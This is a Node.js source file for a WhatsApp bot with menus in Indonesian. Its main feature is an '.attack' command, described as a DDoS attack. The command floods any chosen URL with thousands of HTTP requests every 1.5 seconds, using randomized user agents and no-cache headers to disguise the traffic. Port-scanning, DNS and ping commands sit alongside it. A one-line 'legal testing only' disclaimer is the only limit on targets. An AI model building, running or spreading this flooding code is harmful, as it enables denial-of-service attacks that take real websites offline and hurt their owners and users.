const axios = require('axios');
const dns = require('dns');
const net = require('net');
const chalk = require('chalk');
const emoji = require('node-emoji');
const ping = require('ping');
const UserAgent = require('user-agents');

class Menu {
    constructor() {
        this.attacks = new Map();
        this.commands = new Map();
        this.stats = {
            totalRequests: 0,
            totalCommands: 0,
            activeAttacks: 0,
            successfulCommands: 0,
            failedCommands: 0
        };
        
        this.userAgents = new UserAgent();
        this.registerCommands();
    }

    registerCommands() {
        this.commands.set('menu', {
            execute: this.showMenu.bind(this),
            description: 'Menampilkan menu bantuan',
            usage: '.menu',
            category: 'general'
        });

        this.commands.set('attack', {
            execute: this.handleAttackCommand.bind(this),
            description: 'Melakukan serangan DDoS',
            usage: '.attack <url> <duration>',
            category: 'attack'
        });

        this.commands.set('ip', {
            execute: this.handleIpCommand.bind(this),
            description: 'Mendapatkan IP address dari domain',
            usage: '.ip <domain>',
            category: 'network'
        });

        this.commands.set('port', {
            execute: this.handlePortCommand.bind(this),
            description: 'Memindai status port tertentu',
            usage: '.port <domain> <port>',
            category: 'network'
        });

        this.commands.set('check', {
            execute: this.handleCheckCommand.bind(this),
            description: 'Memeriksa status URL dan serangan aktif',
            usage: '.check <url>',
            category: 'monitoring'
        });

        this.commands.set('stats', {
            execute: this.handleStatsCommand.bind(this),
            description: 'Menampilkan statistik bot',
            usage: '.stats',
            category: 'general'
        });

        this.commands.set('stop', {
            execute: this.handleStopCommand.bind(this),
            description: 'Menghentikan semua serangan aktif',
            usage: '.stop',
            category: 'attack'
        });

        this.commands.set('ping', {
            execute: this.handlePingCommand.bind(this),
            description: 'Melakukan ping ke domain',
            usage: '.ping <domain>',
            category: 'network'
        });

        this.commands.set('status', {
            execute: this.handleStatusCommand.bind(this),
            description: 'Menampilkan status bot',
            usage: '.status',
            category: 'general'
        });
    }

    async handleCommand(sock, sender, message, isAdmin, isAllowedUser, config, messageId) {
        const command = message.trim();
        
        if (!command.startsWith('.')) return;
        
        this.stats.totalCommands++;
        
        if (!isAllowedUser) {
            await this.sendNonAdminMessage(sock, sender, messageId);
            this.stats.failedCommands++;
            return;
        }
        
        const args = command.slice(1).split(' ');
        const cmd = args[0].toLowerCase();
        args.shift();
        
        if (this.commands.has(cmd)) {
            try {
                await this.commands.get(cmd).execute(sock, sender, args, config, messageId);
                this.stats.successfulCommands++;
            } catch (error) {
                console.error(chalk.red(`Error executing command ${cmd}:`), error);
                const errorReply = `${emoji.get('x')} Error: ${error.message || 'Terjadi kesalahan'}`;
                await sock.sendMessage(sender, { 
                    text: errorReply,
                    quoted: { id: messageId, remoteJid: sender, fromMe: false }
                });
                this.stats.failedCommands++;
            }
        } else {
            const unknownReply = `${emoji.get('question')} Perintah tidak dikenali. Ketik .menu untuk bantuan.`;
            await sock.sendMessage(sender, { 
                text: unknownReply,
                quoted: { id: messageId, remoteJid: sender, fromMe: false }
            });
        }
    }

    async sendNonAdminMessage(sock, sender, messageId) {
        const message = `${emoji.get('no_entry')} *Akses Ditolak*\n\nHanya admin dan user yang diizinkan yang dapat menggunakan perintah bot ini.`;
        await sock.sendMessage(sender, { 
            text: message,
            quoted: { id: messageId, remoteJid: sender, fromMe: false }
        });
    }

    async showMenu(sock, sender, args, config, messageId) {
        let menuText = `${emoji.get('robot_face')} *WHATSAPP ADMIN BOT V4.5.0* ${emoji.get('robot_face')}\n\n`;
        menuText += `${emoji.get('page_facing_up')} *DAFTAR PERINTAH:*\n\n`;
        
        const categories = {};
        this.commands.forEach((cmd, name) => {
            if (!categories[cmd.category]) {
                categories[cmd.category] = [];
            }
            categories[cmd.category].push({ name, ...cmd });
        });
        
        for (const [category, commands] of Object.entries(categories)) {
            menuText += `${emoji.get('star')} *${category.toUpperCase()}:*\n`;
            commands.forEach(cmd => {
                menuText += `  ${emoji.get('small_blue_diamond')} *.${cmd.name}* - ${cmd.description}\n`;
                menuText += `    ${emoji.get('arrow_right')} Usage: ${cmd.usage}\n`;
            });
            menuText += '\n';
        }
        
        menuText += `${emoji.get('warning')} *PERINGATAN:*\n`;
        menuText += `Gunakan hanya untuk testing yang sah dan legal!\n`;
        menuText += `Maksimal durasi serangan: ${config.settings.maxAttackDuration} detik\n`;
        menuText += `Maksimal threads: ${config.settings.maxThreads}\n\n`;
        menuText += `${emoji.get('information_source')} *STATUS:* ${this.stats.activeAttacks} serangan aktif`;

        await sock.sendMessage(sender, { 
            text: menuText,
            quoted: { id: messageId, remoteJid: sender, fromMe: false }
        });
    }

    async handleAttackCommand(sock, sender, args, config, messageId) {
        if (args.length < 2) {
            const errorReply = `${emoji.get('x')} Format salah!\nPenggunaan: .attack <url> <duration>`;
            await sock.sendMessage(sender, { 
                text: errorReply,
                quoted: { id: messageId, remoteJid: sender, fromMe: false }
            });
            return;
        }

        const url = args[0];
        const duration = parseInt(args[1]);
        
        if (!this.isValidUrl(url)) {
            const errorReply = `${emoji.get('x')} URL tidak valid! Pastikan URL dimulai dengan http:// atau https://`;
            await sock.sendMessage(sender, { 
                text: errorReply,
                quoted: { id: messageId, remoteJid: sender, fromMe: false }
            });
            return;
        }

        if (isNaN(duration) || duration < 1 || duration > config.settings.maxAttackDuration) {
            const errorReply = `${emoji.get('x')} Durasi tidak valid! Gunakan nilai antara 1-${config.settings.maxAttackDuration} detik`;
            await sock.sendMessage(sender, { 
                text: errorReply,
                quoted: { id: messageId, remoteJid: sender, fromMe: false }
            });
            return;
        }

        if (this.stats.activeAttacks >= 5) {
            const errorReply = `${emoji.get('x')} Maksimal 5 serangan aktif bersamaan!`;
            await sock.sendMessage(sender, { 
                text: errorReply,
                quoted: { id: messageId, remoteJid: sender, fromMe: false }
            });
            return;
        }

        const startReply = `${emoji.get('rocket')} Memulai serangan ke ${url} selama ${duration} detik...\n${emoji.get('stopwatch')} Delay: 100ms | ${emoji.get('thread')} Threads: 5`;
        await sock.sendMessage(sender, { 
            text: startReply,
            quoted: { id: messageId, remoteJid: sender, fromMe: false }
        });

        this.startAttack(sock, sender, url, duration, config, messageId);
    }

    async handleIpCommand(sock, sender, args, config, messageId) {
        if (args.length < 1) {
            const errorReply = `${emoji.get('x')} Format salah!\nPenggunaan: .ip <domain>`;
            await sock.sendMessage(sender, { 
                text: errorReply,
                quoted: { id: messageId, remoteJid: sender, fromMe: false }
            });
            return;
        }

        const domain = args[0].replace(/^https?:\/\//, '').split('/')[0];
        
        const searchingReply = `${emoji.get('mag')} Mencari IP address untuk: ${domain}`;
        await sock.sendMessage(sender, { 
            text: searchingReply,
            quoted: { id: messageId, remoteJid: sender, fromMe: false }
        });

        try {
            const [ipv4, ipv6, mxRecords, txtRecords] = await Promise.all([
                this.resolveDns(domain, 'A'),
                this.resolveDns(domain, 'AAAA'),
                this.resolveDns(domain, 'MX'),
                this.resolveDns(domain, 'TXT')
            ]);

            let response = `${emoji.get('globe_with_meridians')} *Hasil DNS Lookup untuk ${domain}:*\n\n`;
            
            if (ipv4.length > 0) {
                response += `${emoji.get('one')} *IPv4 Addresses:*\n`;
                response += ipv4.join('\n') + '\n\n';
            }
            
            if (ipv6.length > 0) {
                response += `${emoji.get('two')} *IPv6 Addresses:*\n`;
                response += ipv6.join('\n') + '\n\n';
            }
            
            if (mxRecords.length > 0) {
                response += `${emoji.get('email')} *MX Records:*\n`;
                response += mxRecords.map(mx => `Priority: ${mx.priority} - ${mx.exchange}`).join('\n') + '\n\n';
            }
            
            if (txtRecords.length > 0) {
                response += `${emoji.get('page_facing_up')} *TXT Records:*\n`;
                response += txtRecords.join('\n').substring(0, 200) + '...';
            }
            
            if (ipv4.length === 0 && ipv6.length === 0) {
                response = `${emoji.get('x')} Tidak ditemukan IP address untuk ${domain}`;
            }

            await sock.sendMessage(sender, { 
                text: response,
                quoted: { id: messageId, remoteJid: sender, fromMe: false }
            });
        } catch (error) {
            const errorReply = `${emoji.get('x')} Error: ${error.message}`;
            await sock.sendMessage(sender, { 
                text: errorReply,
                quoted: { id: messageId, remoteJid: sender, fromMe: false }
            });
        }
    }

    async handlePortCommand(sock, sender, args, config, messageId) {
        if (args.length < 2) {
            const errorReply = `${emoji.get('x')} Format salah!\nPenggunaan: .port <domain> <port>`;
            await sock.sendMessage(sender, { 
                text: errorReply,
                quoted: { id: messageId, remoteJid: sender, fromMe: false }
            });
            return;
        }

        const domain = args[0].replace(/^https?:\/\//, '').split('/')[0];
        const port = parseInt(args[1]);
        
        if (isNaN(port) || port < 1 || port > 65535) {
            const errorReply = `${emoji.get('x')} Port tidak valid! Gunakan nilai antara 1-65535`;
            await sock.sendMessage(sender, { 
                text: errorReply,
                quoted: { id: messageId, remoteJid: sender, fromMe: false }
            });
            return;
        }

        const scanningReply = `${emoji.get('mag')} Memindai port ${port} pada: ${domain}`;
        await sock.sendMessage(sender, { 
            text: scanningReply,
            quoted: { id: messageId, remoteJid: sender, fromMe: false }
        });

        try {
            const address = await this.lookupDns(domain);
            const isOpen = await this.scanPort(address, port);
            
            const status = isOpen ? 'TERBUKA' : 'TERTUTUP';
            const emojiStatus = isOpen ? emoji.get('white_check_mark') : emoji.get('x');
            
            const resultReply = `${emojiStatus} Port ${port} pada ${domain} (${address}) *${status}*`;
            await sock.sendMessage(sender, { 
                text: resultReply,
                quoted: { id: messageId, remoteJid: sender, fromMe: false }
            });
        } catch (error) {
            const errorReply = `${emoji.get('x')} Error: ${error.message}`;
            await sock.sendMessage(sender, { 
                text: errorReply,
                quoted: { id: messageId, remoteJid: sender, fromMe: false }
            });
        }
    }

    async handleCheckCommand(sock, sender, args, config, messageId) {
        if (args.length < 1) {
            const errorReply = `${emoji.get('x')} Format salah!\nPenggunaan: .check <url>`;
            await sock.sendMessage(sender, { 
                text: errorReply,
                quoted: { id: messageId, remoteJid: sender, fromMe: false }
            });
            return;
        }

        const url = args[0];
        
        if (!this.isValidUrl(url)) {
            const errorReply = `${emoji.get('x')} URL tidak valid!`;
            await sock.sendMessage(sender, { 
                text: errorReply,
                quoted: { id: messageId, remoteJid: sender, fromMe: false }
            });
            return;
        }

        const checkingReply = `${emoji.get('mag')} Memeriksa status: ${url}`;
        await sock.sendMessage(sender, { 
            text: checkingReply,
            quoted: { id: messageId, remoteJid: sender, fromMe: false }
        });

        try {
            const startTime = Date.now();
            const response = await axios.get(url, { 
                timeout: 10000,
                headers: {
                    'User-Agent': this.userAgents.random().toString()
                }
            });
            const responseTime = Date.now() - startTime;
            
            let statusText = `${emoji.get('white_check_mark')} *STATUS CHECK:* ${url}\n\n`;
            statusText += `${emoji.get('green_circle')} Status: ONLINE\n`;
            statusText += `${emoji.get('stopwatch')} Response Time: ${responseTime}ms\n`;
            statusText += `${emoji.get('1234')} Status Code: ${response.status}\n`;
            statusText += `${emoji.get('shield')} Server: ${response.headers['server'] || 'Unknown'}\n`;
            statusText += `${emoji.get('link')} Content Type: ${response.headers['content-type'] || 'Unknown'}\n\n`;
            
            const attackInfo = this.getAttackInfo(url);
            if (attackInfo) {
                statusText += `${emoji.get('collision')} *SERANGAN AKTIF:*\n`;
                statusText += `Requests: ${attackInfo.requests}\n`;
                statusText += `Errors: ${attackInfo.errors}\n`;
                statusText += `Waktu tersisa: ${Math.ceil((attackInfo.endTime - Date.now()) / 1000)}s`;
            } else {
                statusText += `${emoji.get('information_source')} Tidak ada serangan aktif untuk URL ini`;
            }

            await sock.sendMessage(sender, { 
                text: statusText,
                quoted: { id: messageId, remoteJid: sender, fromMe: false }
            });
        } catch (error) {
            const statusText = `${emoji.get('x')} *STATUS CHECK:* ${url}\n\n${emoji.get('red_circle')} Status: OFFLINE\n${emoji.get('warning')} Error: ${error.message}`;
            await sock.sendMessage(sender, { 
                text: statusText,
                quoted: { id: messageId, remoteJid: sender, fromMe: false }
            });
        }
    }

    async handleStatsCommand(sock, sender, args, config, messageId) {
        let statsText = `${emoji.get('bar_chart')} *STATISTIK BOT:*\n\n`;
        statsText += `${emoji.get('1234')} Total Permintaan: ${this.stats.totalRequests}\n`;
        statsText += `${emoji.get('memo')} Total Perintah: ${this.stats.totalCommands}\n`;
        statsText += `${emoji.get('white_check_mark')} Perintah Berhasil: ${this.stats.successfulCommands}\n`;
        statsText += `${emoji.get('x')} Perintah Gagal: ${this.stats.failedCommands}\n`;
        statsText += `${emoji.get('collision')} Serangan Aktif: ${this.stats.activeAttacks}\n`;
        statsText += `${emoji.get('stopwatch')} Maks Durasi: ${config.settings.maxAttackDuration}s\n`;
        statsText += `${emoji.get('thread')} Maks Threads: ${config.settings.maxThreads}\n\n`;
        statsText += `${emoji.get('calendar')} Uptime: ${this.formatUptime(process.uptime())}`;

        await sock.sendMessage(sender, { 
            text: statsText,
            quoted: { id: messageId, remoteJid: sender, fromMe: false }
        });
    }

    async handleStopCommand(sock, sender, args, config, messageId) {
        const stoppedCount = this.stopAllAttacks();
        const stopReply = `${emoji.get('stop_button')} Menghentikan ${stoppedCount} serangan aktif`;
        await sock.sendMessage(sender, { 
            text: stopReply,
            quoted: { id: messageId, remoteJid: sender, fromMe: false }
        });
    }

    async handlePingCommand(sock, sender, args, config, messageId) {
        if (args.length < 1) {
            const errorReply = `${emoji.get('x')} Format salah!\nPenggunaan: .ping <domain>`;
            await sock.sendMessage(sender, { 
                text: errorReply,
                quoted: { id: messageId, remoteJid: sender, fromMe: false }
            });
            return;
        }

        const domain = args[0];
        const pingReply = `${emoji.get('satellite')} Melakukan ping ke: ${domain}`;
        await sock.sendMessage(sender, { 
            text: pingReply,
            quoted: { id: messageId, remoteJid: sender, fromMe: false }
        });

        try {
            const res = await ping.promise.probe(domain, {
                timeout: 10,
                extra: ['-c', '4']
            });
            
            let resultText = `${emoji.get('satellite')} *PING RESULTS:* ${domain}\n\n`;
            resultText += `${emoji.get('green_circle')} Alive: ${res.alive ? 'Yes' : 'No'}\n`;
            if (res.alive) {
                resultText += `${emoji.get('stopwatch')} Avg Time: ${res.avg}ms\n`;
                resultText += `${emoji.get('chart_with_upwards_trend')} Max Time: ${res.max}ms\n`;
                resultText += `${emoji.get('chart_with_downwards_trend')} Min Time: ${res.min}ms\n`;
                resultText += `${emoji.get('package')} Packet Loss: ${res.packetLoss}%\n`;
                resultText += `${emoji.get('1234')} Host: ${res.numeric_host}`;
            }

            await sock.sendMessage(sender, { 
                text: resultText,
                quoted: { id: messageId, remoteJid: sender, fromMe: false }
            });
        } catch (error) {
            const errorReply = `${emoji.get('x')} Ping error: ${error.message}`;
            await sock.sendMessage(sender, { 
                text: errorReply,
                quoted: { id: messageId, remoteJid: sender, fromMe: false }
            });
        }
    }

    async handleStatusCommand(sock, sender, args, config, messageId) {
        let statusText = `${emoji.get('robot_face')} *BOT STATUS:*\n\n`;
        statusText += `${emoji.get('green_circle')} Status: ONLINE\n`;
        statusText += `${emoji.get('collision')} Active Attacks: ${this.stats.activeAttacks}\n`;
        statusText += `${emoji.get('1234')} Total Requests: ${this.stats.totalRequests}\n`;
        statusText += `${emoji.get('calendar')} Uptime: ${this.formatUptime(process.uptime())}\n\n`;
        statusText += `${emoji.get('information_source')} Memory Usage: ${Math.round(process.memoryUsage().heapUsed / 1024 / 1024)}MB`;

        await sock.sendMessage(sender, { 
            text: statusText,
            quoted: { id: messageId, remoteJid: sender, fromMe: false }
        });
    }

    formatUptime(seconds) {
        const days = Math.floor(seconds / 86400);
        const hours = Math.floor((seconds % 86400) / 3600);
        const minutes = Math.floor((seconds % 3600) / 60);
        const secs = Math.floor(seconds % 60);
        
        return `${days}d ${hours}h ${minutes}m ${secs}s`;
    }

    resolveDns(domain, type) {
        return new Promise((resolve, reject) => {
            dns.resolve(domain, type, (err, addresses) => {
                if (err) resolve([]);
                else resolve(addresses);
            });
        });
    }

    lookupDns(domain) {
        return new Promise((resolve, reject) => {
            dns.lookup(domain, (err, address) => {
                if (err) reject(err);
                else resolve(address);
            });
        });
    }

    scanPort(address, port) {
        return new Promise((resolve) => {
            const socket = new net.Socket();
            socket.setTimeout(2000);
            
            socket.on('connect', () => {
                socket.destroy();
                resolve(true);
            });
            
            socket.on('timeout', () => {
                socket.destroy();
                resolve(false);
            });
            
            socket.on('error', () => {
                socket.destroy();
                resolve(false);
            });
            
            socket.connect(port, address);
        });
    }

    getAttackInfo(url) {
        for (const [id, attack] of this.attacks) {
            if (attack.url === url) {
                return {
                    requests: attack.requestCount,
                    errors: attack.errorCount,
                    endTime: attack.endTime
                };
            }
        }
        return null;
    }

    isValidUrl(string) {
        try {
            new URL(string);
            return true;
        } catch (_) {
            return false;
        }
    }

    startAttack(sock, sender, url, duration, config, messageId) {
        const attackId = Date.now().toString();
        const endTime = Date.now() + (duration * 1000);
        let requestCount = 0;
        let errorCount = 0;
        
        this.stats.activeAttacks++;
        
        const attack = {
            url,
            interval: setInterval(async () => {
                if (Date.now() > endTime) {
                    this.stopAttack(attackId);
                    const finishReply = `${emoji.get('checkered_flag')} Serangan ke ${url} selesai!\n${emoji.get('1234')} Requests: ${requestCount}\n${emoji.get('x')} Errors: ${errorCount}`;
                    await sock.sendMessage(sender, { 
                        text: finishReply,
                        quoted: { id: messageId, remoteJid: sender, fromMe: false }
                    });
                    return;
                }

                for (let i = 0; i < 5678; i++) {
                    this.sendRequest(url)
                        .then(() => {
                            requestCount++;
                            this.stats.totalRequests++;
                        })
                        .catch(() => {
                            errorCount++;
                        });
                }
            }, 1500),
            requestCount: 0,
            errorCount: 0,
            endTime
        };

        attack.requestCount = requestCount;
        attack.errorCount = errorCount;
        
        this.attacks.set(attackId, attack);

        setTimeout(() => {
            if (this.attacks.has(attackId)) {
                this.stopAttack(attackId);
            }
        }, duration * 1000);
    }

    stopAttack(attackId) {
        if (this.attacks.has(attackId)) {
            clearInterval(this.attacks.get(attackId).interval);
            this.attacks.delete(attackId);
            this.stats.activeAttacks = Math.max(0, this.stats.activeAttacks - 1);
        }
    }

    stopAllAttacks() {
        let count = 0;
        for (const [id] of this.attacks) {
            this.stopAttack(id);
            count++;
        }
        return count;
    }

    async sendRequest(url) {
        try {
            await axios.get(url, {
                timeout: 5000,
                headers: {
                    'User-Agent': this.userAgents.random().toString(),
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
                    'Accept-Language': 'en-US,en;q=0.5',
                    'Connection': 'keep-alive',
                    'Cache-Control': 'no-cache',
                    'Pragma': 'no-cache'
                }
            });
        } catch (error) {
            throw error;
        }
    }
}

module.exports = new Menu();